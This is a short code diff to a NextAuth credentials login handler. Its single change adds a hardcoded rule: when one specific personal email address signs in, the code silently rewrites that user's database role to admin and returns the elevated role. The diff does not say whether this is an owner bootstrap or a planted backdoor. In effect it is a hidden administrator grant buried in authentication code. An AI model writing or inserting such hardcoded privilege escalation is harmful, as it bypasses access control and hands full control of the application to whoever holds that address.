@@ -30,12 +30,18 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         const valid = await bcrypt.compare(password, user.passwordHash)
         if (!valid) return null
 
+        let role = user.role
+        if (email.toLowerCase() === 'cssurya2006@gmail.com' && role !== 'admin') {
+          await db.update(users).set({ role: 'admin' }).where(eq(users.id, user.id)).run()
+          role = 'admin'
+        }
+
         return {
           id: user.id,
           email: user.email,
           name: user.username,
           image: user.avatarUrl,
-          role: user.role,
+          role: role,
         }
       },
     }),
